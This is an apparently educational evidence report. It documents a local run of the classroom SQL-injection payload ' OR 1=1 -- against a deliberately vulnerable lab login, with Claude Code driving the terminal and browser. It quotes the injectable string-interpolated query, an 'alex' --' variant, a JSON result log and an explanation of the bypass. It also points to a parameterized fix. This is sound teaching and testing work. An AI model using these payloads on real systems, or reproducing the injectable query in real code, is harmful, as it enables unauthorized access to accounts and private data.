# SQL-injection baseline evidence — November 11, 2026

Evidence for [issue #7](https://github.com/QuinnRana/operation-secure-login/issues/7): the page's supplied classroom payload against the intentionally vulnerable Attack Lab, recorded before any change to that lab's query. All data is fictional, and the target was a local development server only.

This is one run by Matthew (matthewgill3035-rgb) with Claude Code driving the terminal and a local browser. Per #7's "Done when", another teammate still needs to repeat it.

## Tested build and target

| Field | Value |
|---|---|
| Commit | `codex/development` `45556a05472ef88fb2a2b9ff2d2fc6f41c3e436d` (after PR #36) |
| Checkout | Fresh clone, detached at that commit, no local changes, new local databases |
| Date | 2026-11-11, about 21:50 UTC |
| Runtime | Node v24.22.1, pnpm 11.25.0, macOS 14.5 (arm64) |
| Checks | `pnpm install --frozen-lockfile` passed; `pnpm test` 39/39 passed |
| Lab target | `/attack-lab` on the local dev server only. The server printed `Local: http://localhost:5182/`. |
| Seed/reset state | **Reset lab data** was run first: "Lab data reset to the 3 fictional seed records." The lab table then held exactly `alex`, `jamie` and `casey`. |
| Vulnerable code | `app/attack-lab/actions.ts` line 65; the query text is identical to the original lab commit `d351791` (then line 47) |

## Results

| # | Username | Password | Message | Query shown on the page | Records | Screenshot |
|---|---|---|---|---|---|---|
| 0 | — | — | "Lab data reset to the 3 fictional seed records." | — | — | [01](attack-baseline-2026-11-11/01-lab-reset.jpg) |
| 1 | `alex` | `wrong` | "Login failed." | `… WHERE username = 'alex' AND password = 'wrong'` | none | [02](attack-baseline-2026-11-11/02-wrong-password.jpg) |
| 2 | `alex` | `falcon7` | "Login bypassed. 1 fictional record exposed." | `… WHERE username = 'alex' AND password = 'falcon7'` | Alex Morgan | — |
| 3 | `' OR 1=1 --` | `anything` | **"Login bypassed. 3 fictional records exposed."** | `… WHERE username = '' OR 1=1 --' AND password = 'anything'` | **Alex Morgan, Jamie Lee, Casey Rivera** with their roles and private notes | [03](attack-baseline-2026-11-11/03-payload-bypass.jpg) |

**How each case was captured.** The log script ran first (all four steps, at 21:50:57 UTC). A few minutes later the screenshots were taken in the browser after a fresh **Reset lab data** (screenshot 01): case 1 was filled in by script inside the page, and in case 3 the payload was typed into the fields with real keyboard events by Claude Code driving the local browser, not set by script. Case 2 has no screenshot; its evidence is the log. The browser console showed no errors.

Case 2 is a normal login with the real fictional password. The lab says "bypassed" for every row its query returns, including legitimate ones.

## Why the payload works

The lab builds its SQL by pasting the two form fields straight into the query text (`app/attack-lab/actions.ts`, line 65):

```ts
`SELECT display_name, role, private_note FROM lab_accounts WHERE username = '${username}' AND password = '${password}'`
```

With the username `' OR 1=1 --`, the text the database receives becomes:

```sql
SELECT display_name, role, private_note FROM lab_accounts
WHERE username = '' OR 1=1 --' AND password = 'anything'
```

1. The first `'` in the input **closes** the string the code opened, so `username = ''` is now a finished comparison.
2. `OR 1=1` is added as **SQL code, not data**. `1=1` is true for every row, so the whole `WHERE` condition is true for every row.
3. `--` starts a **comment**, so the rest (`' AND password = 'anything'`) is ignored. The password check never runs.

The database therefore returns **every row** in the table, and the page treats that as a successful login.

**A bypass, not a known password.** The attacker never learns or guesses anyone's password: `anything` could be any text, and no password is checked at all. The payload works by changing the *structure* of the query so the password condition disappears. That is why it returned all three accounts at once, something no single correct password could do. A similar input, `alex' --`, targets one account the same way: it keeps `username = 'alex'` and comments out the password check.

**The fix.** The defended lab (`/defended-lab`, #8) sends the username to the database as a bound parameter, so input is always data and can never become SQL. It also checks salted password hashes in code. The same payload there returns "The username or password is incorrect." ([before/after evidence](before-after-2026-11-09.md)).

## Reproducible log

`node scripts/attack-baseline-log.mjs http://localhost:5182` replays steps 0–3 as a browser without JavaScript would. It refuses any host other than local http, does not follow redirects, uses only the supplied payload and the fictional accounts, and exits nonzero if any checked message, query or record differs (every step's message, the queries for steps 1 and 3, and all returned records). It passed on the first run at 21:50:57 UTC and again, with the stricter checks, at 21:57:17 UTC against the same commit. Output of the second run (fields and records shortened):

```json
{
  "target": "http://localhost:5182",
  "page": "/attack-lab",
  "checkedAt": "2026-11-11T21:57:17.526Z",
  "steps": [
    { "step": "reset lab to its seed", "message": "Lab data reset to the 3 fictional seed records." },
    { "step": "ordinary wrong password", "input": { "username": "alex", "password": "wrong" },
      "message": "Login failed.", "records": [] },
    { "step": "real fictional credentials", "input": { "username": "alex", "password": "falcon7" },
      "message": "Login bypassed. 1 fictional record exposed.", "records": ["Alex Morgan"] },
    { "step": "supplied classroom payload", "input": { "username": "' OR 1=1 --", "password": "anything" },
      "message": "Login bypassed. 3 fictional records exposed.",
      "query": "SELECT display_name, role, private_note FROM lab_accounts WHERE username = '' OR 1=1 --' AND password = 'anything'",
      "records": ["Alex Morgan", "Jamie Lee", "Casey Rivera"] }
  ]
}
```

The log and screenshots contain only the fictional seed accounts and notes from the source code, with no real data or secrets.

## Teammate reproduction

To repeat this, check out the commit above (or a later one where the lab is unchanged), run `pnpm dev --host 127.0.0.1`, open `/attack-lab`, press **Reset lab data**, then try cases 1–3 by hand or run the script against the printed URL.

| Field | Value |
|---|---|
| Teammate, date, computer / OS | Pending |
| Commit | Pending |
| Cases 0–3 actual results | Pending |
| Can explain the root cause | Pending |
